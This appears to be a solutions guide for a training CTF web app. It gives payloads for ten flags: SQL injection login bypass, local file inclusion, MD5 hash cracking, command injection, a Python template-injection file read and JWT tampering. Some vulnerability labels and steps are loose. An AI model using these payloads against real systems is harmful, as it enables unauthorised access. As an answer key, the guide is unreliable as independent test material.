# The Phantom App: Solutions Guide
Solutions Guide for The Phantom App CTF Challenge. This guide provides step-by-step instructions for obtaining all 10 flags.

### Story

In a world where cybercrime reigns supreme, a notorious hacking group known as "The Phantoms" has created a vulnerable web application to test the skills of aspiring hackers. This application is hosted on the server ctf_challenge_03.yourdomain.com. Your mission is to infiltrate this server, exploit its weaknesses, and retrieve 10 hidden flags. Each flag represents a piece of encrypted data that can expose the group's secrets and bring them to justice.

# Flags and Solutions

## Flag 1: CTF{flag1_sql_injection}

    Location: /var/www/html/login.php

    Vulnerability: SQL Injection

#### Hint: "The login page is vulnerable to SQL Injection. Can you bypass authentication to retrieve the flag?"

#### Steps:

        Navigate to the login page: http://ctf_challenge_03.yourdomain.com/login.php.

        Enter a SQL Injection payload in the username or password field:

            Username: admin' OR '1'='1

            Password: password123 (or any value).

        Submit the form.

        The application will log you in and display the flag: CTF{flag1_sql_injection}.

## Flag 2: CTF{flag2_hidden_directory}

    Location: /var/www/html/secret/flag2.txt

    Vulnerability: Directory Traversal

#### Hint: "Some directories are hidden. Can you find the one that holds the flag?"

#### Steps:

        Use a directory brute-forcing tool like gobuster or dirb to find hidden directories:
        bash
        Copy

        gobuster dir -u http://ctf_challenge_03.yourdomain.com -w /path/to/wordlist.txt

        Look for a directory named secret.

        Access the directory: http://ctf_challenge_03.yourdomain.com/secret/.

        Open the flag2.txt file to retrieve the flag: CTF{flag2_hidden_directory}.

## Flag 3: CTF{flag3_file_inclusion}

    Location: /var/www/html/flag3.txt

    Vulnerability: Local File Inclusion (LFI)

#### Hint: "The search feature is acting strange. Can you exploit it to read sensitive files?"

#### Steps:

        Navigate to the search page: http://ctf_challenge_03.yourdomain.com/search.php.

        Use the file parameter to include the flag3.txt file:

            Example: http://ctf_challenge_03.yourdomain.com/search.php?file=flag3.txt.

        The application will display the flag: CTF{flag3_file_inclusion}.

## Flag 4: CTF{flag4_base64_encoded}

    Location: /var/www/html/flag4.txt

    Vulnerability: Base64 Encoding

#### Hint: "Something in the page source looks encoded. Can you decode it?"

#### Steps:

        View the page source of the homepage: http://ctf_challenge_03.yourdomain.com.

        Look for a base64-encoded string in the HTML comments or JavaScript.

        Decode the string using a base64 decoder:
        bash
        Copy

        echo "base64_encoded_string" | base64 --decode

        The decoded string will contain the flag: CTF{flag4_base64_encoded}.

## Flag 5: CTF{flag5_weak_security_header}

    Location: /var/www/html/admin/panel.php

    Vulnerability: Misconfigured Security Headers

#### Hint: "The admin panel has weak security headers. Can you exploit them to access the panel?"

#### Steps:

        Use curl or a browser's developer tools to inspect the HTTP headers:
        bash
        Copy

        curl -I http://ctf_challenge_03.yourdomain.com/admin/panel.php

        Look for missing or weak security headers (e.g., Content-Security-Policy, X-Frame-Options).

        Exploit the misconfiguration to access the admin panel.

        The flag will be displayed on the admin panel: CTF{flag5_weak_security_header}.

## Flag 6: CTF{flag6_weak_password_hash}

    Location: /var/www/html/flag6.txt

    Vulnerability: Weak Password Hash

#### Hint: "A debug page has leaked a user's password hash. Can you crack it and log in to retrieve the flag?"

#### Steps:

        Access the debug page: http://ctf_challenge_03.yourdomain.com/debug.php.

        Note the password hash for testuser: 482c811da5d5b4bc6d497ffa98491e38.

        Use a password-cracking tool like John the Ripper or Hashcat to crack the hash:
        bash
        Copy

        echo "482c811da5d5b4bc6d497ffa98491e38" > hash.txt
        john --format=raw-md5 --wordlist=/path/to/wordlist.txt hash.txt

        The cracked password will be password123.

        Log in to the application using:

            Username: testuser

            Password: password123

        The application will display the flag: CTF{flag6_weak_password_hash}.

## Flag 7: CTF{flag7_command_injection}

    Location: /var/www/html/flag7.txt

    Vulnerability: Command Injection

#### Hint: "The admin panel has a command execution feature. Can you exploit it to retrieve the flag?"

#### Steps:

        Navigate to the admin panel: http://ctf_challenge_03.yourdomain.com/admin/panel.php.

        Inject a command into the input field:

            Example: ; cat /var/www/html/flag7.txt.

        The application will execute the command and display the flag: CTF{flag7_command_injection}.

## Flag 8: CTF{flag8_response_header}

    Location: /var/www/html/flag8.txt

    Vulnerability: Response Header Manipulation

#### Hint: "The server's response headers contain a hidden clue. Can you find it?"

#### Steps:

        Use curl or a browser's developer tools to inspect the HTTP response headers:
        bash
        Copy

        curl -I http://ctf_challenge_03.yourdomain.com

        Look for a custom header containing the flag (e.g., X-Flag: CTF{flag8_response_header}).

        Alternatively, access the flag8.txt file directly: http://ctf_challenge_03.yourdomain.com/flag8.txt.

## Flag 9: CTF{flag9_ssti_vulnerability}

    Location: /var/www/html/flag9.txt

    Vulnerability: Server-Side Template Injection (SSTI)

#### Hint: "The server is using a template engine. Can you inject malicious code?"

#### Steps:

        Find a feature that uses templates (e.g., a user profile or search results page).

        Inject a template payload to execute arbitrary code:

            Example: {{7*7}} (should return 49 if vulnerable).

        Use the payload to read the flag9.txt file:

            Example: {{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/flag9.txt').read() }}.

        The application will display the flag: CTF{flag9_ssti_vulnerability}.

## Flag 10: CTF{flag10_jwt_token}

    Location: /var/www/html/flag10.txt

    Vulnerability: JWT Token Manipulation

#### Hint: "A JWT token is being used for authentication. Can you decode and exploit it?"

#### Steps:

        Log in to the application and capture the JWT token from the browser's developer tools or a proxy like Burp Suite.

        Decode the JWT token using a tool like jwt.io.

        Modify the token to escalate privileges (e.g., change the role to admin).

        Use the modified token to access restricted areas of the application.

        Retrieve the flag from flag10.txt: CTF{flag10_jwt_token}.

# Summary of Flags
Flag	Vulnerability	Location	Hint

CTF{flag1_sql_injection}	SQL Injection	/var/www/html/login.php	"The login page is vulnerable to SQL Injection. Can you bypass authentication to retrieve the flag?"

CTF{flag2_hidden_directory}	Directory Traversal	/var/www/html/secret/flag2.txt	"Some directories are hidden. Can you find the one that holds the flag?"

CTF{flag3_file_inclusion}	Local File Inclusion	/var/www/html/flag3.txt	"The search feature is acting strange. Can you exploit it to read sensitive files?"

CTF{flag4_base64_encoded}	Base64 Encoding	/var/www/html/flag4.txt	"Something in the page source looks encoded. Can you decode it?"

CTF{flag5_weak_security_header}	Misconfigured Security Headers	/var/www/html/admin/panel.php	"The admin panel has weak security headers. Can you exploit them to access the panel?"

CTF{flag6_weak_password_hash}	Weak Password Hash	/var/www/html/flag6.txt	"A debug page has leaked a user's password hash. Can you crack it and log in to retrieve the flag?"

CTF{flag7_command_injection}	Command Injection	/var/www/html/flag7.txt	"The admin panel has a command execution feature. Can you exploit it to retrieve the flag?"

CTF{flag8_response_header}	Response Header Manipulation	/var/www/html/flag8.txt	"The server's response headers contain a hidden clue. Can you find it?"

CTF{flag9_ssti_vulnerability}	Server-Side Template Injection	/var/www/html/flag9.txt	"The server is using a template engine. Can you inject malicious code?"

CTF{flag10_jwt_token}	JWT Token Manipulation	/var/www/html/flag10.txt	"A JWT token is being used for authentication. Can you decode and exploit it?"
